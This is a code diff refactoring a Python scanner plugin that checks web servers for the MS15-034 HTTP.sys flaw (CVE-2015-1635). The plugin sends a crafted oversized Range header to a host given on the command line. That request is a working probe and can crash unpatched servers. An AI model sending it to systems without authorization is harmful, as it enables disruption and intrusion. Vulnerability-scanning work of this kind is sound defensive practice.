@@ -12,17 +12,12 @@ import warnings
 import socket
 
 from urllib.parse import urlparse
-
-class ms15034_httpsys_rce_BaseVerify:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['ms15_034 http.sys远程代码执行(CVE-2015-1635)', '', '']
         port = 80
-        if r"http" in self.url:
+        if r"http" in url:
             #提取host
-            host = urlparse(self.url)[1]
+            host = urlparse(url)[1]
             try:
                 port = int(host.split(':')[1])
             except:
@@ -31,17 +26,17 @@ class ms15034_httpsys_rce_BaseVerify:
             if flag != -1:
                 host = host[:flag]
         else:
-            if self.url.find(":") >= 0:
-                host = self.url.split(":")[0]
-                port = int(self.url.split(":")[1])
+            if url.find(":") >= 0:
+                host = url.split(":")[0]
+                port = int(url.split(":")[1])
             else:
-                host = self.url
+                host = url
 
         try:
             request = "GET / HTTP/1.1\r\nHost: %s\r\nRange: bytes=0-18446744073709551615\r\n\r\n"%host
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.settimeout(6)
-            if r"https" in self.url:
+            if r"https" in url:
                 sock = ssl.wrap_socket(sock)
             sock.connect((host, port))
             sock.send(request.encode())
@@ -58,5 +53,5 @@ class ms15034_httpsys_rce_BaseVerify:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = ms15034_httpsys_rce_BaseVerify(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
+
